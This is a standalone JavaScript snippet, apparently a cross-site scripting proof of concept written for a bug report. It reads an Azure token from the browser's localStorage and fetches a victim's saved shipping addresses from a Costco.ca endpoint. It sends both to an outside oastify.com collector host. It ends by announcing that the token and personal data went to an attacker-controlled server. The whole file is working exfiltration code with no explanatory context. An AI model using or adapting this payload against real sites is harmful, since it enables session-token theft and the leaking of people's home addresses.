var victimAzureToken=localStorage.getItem('azure_token');
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://e3i77kap4h339kkd36vsuu263x9oxel3.oastify.com", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    var response = xhr.responseText;
    console.log(response);
    // Process the response data here
  } else if (xhr.readyState === 4) {
    console.log('Request failed with status code:', xhr.status);
    // Handle any errors that occur during the request
  }
};
var requestBody = "cookies=" + victimAzureToken;
xhr.send(requestBody);


var victimAddress;
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://www.costco.ca/AjaxCostcoGetAddressCmd?requesttype=ajax&addressType=S&filterName=ALL&filterOrder=RECENT&start=1&end=100000", true);

xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    var response = xhr.responseText;
    victimAddress = response
    //get and send PII
    var reqBody = victimAddress;
    var xhrr = new XMLHttpRequest();
    xhrr.open("POST", "https://e3i77kap4h339kkd36vsuu263x9oxel3.oastify.com", true);
    xhrr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    var requestBody = reqBody;
    xhrr.send(requestBody);
    console.log(response);
    // Process the response data here
  } else if (xhr.readyState === 4) {
    console.log('Request failed with status code:', xhr.status);
    // Handle any errors that occur during the request
  }
};

xhr.send(requestBody);

console.log(victimAzureToken)
console.log(requestBody)

alert("ALL DONE - JWT AND PII SENT TO ATTACKER CONTROLLED SERVER - Please check console log for reference")
